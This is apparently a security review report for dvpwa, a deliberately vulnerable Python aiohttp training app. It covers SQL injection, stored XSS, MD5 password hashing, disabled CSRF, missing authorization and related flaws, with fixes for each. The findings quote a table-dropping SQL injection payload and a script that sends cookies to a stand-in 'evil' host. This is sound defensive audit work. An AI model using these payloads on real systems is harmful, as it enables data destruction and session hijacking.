summary: Reviewed the dvpwa aiohttp application end to end: DAO layer (sqli/dao/*), request handlers (sqli/views.py), auth/session utilities (sqli/utils/*, sqli/middlewares.py), app wiring (sqli/app.py, sqli/routes.py), services, forms, templates and config. This is a deliberately vulnerable training app and the overall risk is critical: a classic SQL injection, globally disabled output escaping (stored XSS), MD5 password storage, disabled CSRF protection, JS-readable session cookies, and no server-side authorization on state-changing/admin actions. Static assets and fonts were not reviewed.

findings.title: SQL injection in Student.create via Python string formatting
findings.description: Student.create builds the INSERT statement with Python %-formatting, splicing the raw student name directly into SQL instead of passing it as a bound parameter. The name comes straight from attacker-controlled form data: views.students() (POST /students/) reads data['name'] from request.post() and passes it unvalidated to Student.create. Because CSRF is disabled (see separate finding) the POST is reachable by any client. An attacker can inject arbitrary SQL, e.g. name = x'); DROP TABLE students; -- or stacked/sub-select payloads to read other tables (including users.pwd_hash) via the postgres backend. Every other DAO method in the project correctly uses bound parameters; this one is the outlier.
findings.evidence: q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name})  # name = request.post()['name']  ->  cur.execute(q)  (no parameters passed)
findings.recommendation: Use a parameterized query exactly like the other DAOs: await cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never interpolate user input into the SQL text.

findings.title: Global Jinja2 autoescape disabled enabling stored XSS
findings.description: aiohttp_jinja2 is configured with autoescape=False for all templates, so every {{ ... }} emits raw, unescaped HTML. User-supplied values that are stored and later rendered become stored XSS. Concretely, review_text submitted at POST /courses/{id}/review is stored by Review.create and rendered unescaped at sqli/templates/course.jinja2:22; course.title/description (courses.jinja2 / course.jinja2:14-15) and student name (students.jinja2:16) are likewise attacker-controlled and rendered raw. A payload like <script>document.location='//evil/?c='+document.cookie</script> in a review will execute in every visitor's browser, and because the session cookie is not HttpOnly (separate finding) it can steal sessions.
findings.evidence: setup_jinja(app, loader=PackageLoader('sqli','templates'), context_processors=[...], autoescape=False)  ->  course.jinja2:22 `{{ review.review_text }}` renders stored user input unescaped
findings.recommendation: Set autoescape=True (the default) in setup_jinja, and use explicit |safe only where output is known-safe. Validate/encode user input on the way in as defense in depth.

findings.title: Passwords stored and verified with unsalted MD5
findings.description: User.check_password compares the stored pwd_hash against an unsalted single-round MD5 of the supplied password. MD5 is cryptographically broken and extremely fast to brute-force, and the lack of a per-user salt enables rainbow-table and batch cracking. If the users table is leaked (e.g. via the SQL injection above), all passwords are trivially recoverable, including admin accounts. The same MD5 scheme is implied for password creation (the fixtures/migrations seed pwd_hash values).
findings.recommendation: Use a memory-hard adaptive password hash (Argon2id via argon2-cffi, or bcrypt) with per-user salts, and migrate existing hashes on next login. Also use a constant-time comparison.

findings.title: No server-side authorization on state-changing and admin actions
findings.description: The authorize() decorator exists but is applied only to logout. The evaluate handler assigns grades to students for a course and is gated behind {% if auth_user.is_admin %} in the UI only (course.jinja2:41) — the handler itself performs no authentication or admin check, so any anonymous client can POST /students/{id}/evaluate/{course_id} and set marks, a privilege-escalation / broken-access-control flaw. The same missing-authorization pattern affects students() POST (create student, views.py:54-57), courses() POST (create course, views.py:86-90) and review() POST (create review, views.py:119-129): none require authentication. With CSRF disabled these are directly reachable.
findings.evidence: async def evaluate(request): ... student_id=...; course_id=...; data = await request.post(); ... await Mark.create(conn, student_id, course_id, data['points'])  # no @authorize / is_admin check
findings.recommendation: Apply @authorize(ensure_admin=True) to evaluate and any admin-only mutation, and @authorize() to the other POST handlers that create data. Enforce authorization server-side, deny by default.

findings.title: CSRF protection middleware disabled application-wide
findings.description: A working csrf_middleware is implemented in sqli/middlewares.py (validates a session-bound _csrf_token on POST), but it is commented out of the application's middleware list, so no CSRF validation runs on any POST route. All state-changing endpoints (login, create student/course/review, evaluate/grade, logout) are therefore vulnerable to cross-site request forgery, and the absence of CSRF checks also makes the unauthenticated SQLi/XSS injection endpoints trivially reachable from a victim's browser.
findings.evidence: middlewares=[ session_middleware, # csrf_middleware, error_middleware ]  (csrf_middleware commented out)
findings.recommendation: Re-enable csrf_middleware in the middleware chain and ensure every form submits the csrf_token() hidden field; reject POSTs with a missing/mismatched token.

findings.title: Session cookie set with HttpOnly disabled
findings.description: RedisStorage is instantiated with httponly=False, so the session cookie is readable from JavaScript via document.cookie. Combined with the global XSS exposure (autoescape disabled), any injected script can exfiltrate the session cookie and hijack authenticated/admin sessions. The cookie is also not marked Secure, so it can leak over plaintext HTTP.
findings.recommendation: Use the default httponly=True (and set secure=True behind TLS, plus samesite='Lax'/'Strict') so the session identifier is not accessible to client-side scripts.

findings.title: Application runs with debug mode enabled
findings.description: The aiohttp Application is constructed with debug=True (and run.py configures root logging at DEBUG). Debug mode enables verbose diagnostics and more detailed error surfacing, which can disclose internal state and stack information to clients and increases attack surface. This should never be enabled in a deployed environment.
findings.recommendation: Drive debug from configuration/environment and default it to False in production; keep log levels at INFO/WARNING in deployed environments.

findings.title: Hardcoded default database credentials in config
findings.description: The database is configured with the well-known default postgres/postgres credentials committed in the repository and consumed by services/db.py to build the DSN. If this config is reused beyond local development (the docker-compose setup wires these services together), the default credentials provide trivial database access. Secrets should not live in version control.
findings.evidence:
db:
  user: postgres
  password: postgres  ->  services/db.py builds 'dbname={database} user={user} password={password} ...'.format(**conf)
findings.recommendation: Load credentials from environment variables or a secrets manager, use strong non-default passwords, and keep real secrets out of the repository.
